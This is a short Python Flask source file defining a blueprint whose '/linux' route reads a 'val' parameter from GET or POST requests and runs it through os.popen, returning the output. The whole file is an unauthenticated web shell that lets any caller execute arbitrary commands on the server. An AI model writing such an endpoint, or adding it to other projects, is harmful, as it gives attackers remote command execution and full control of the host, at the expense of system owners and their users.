import os
from flask import Blueprint, render_template, redirect,request

linuxos = Blueprint("linuxos",__name__)

@linuxos.route('/linux',methods=['POST','GET'])
def linux():
    if request.method == 'POST':
        val = request.form.get("val",None)
        #print(val)
        #re = os.system(val)
        content=os.popen(val).read()
    else:
        val = request.args.get("val",None)
        #print(val)
        content=os.popen(val).read()
    return content
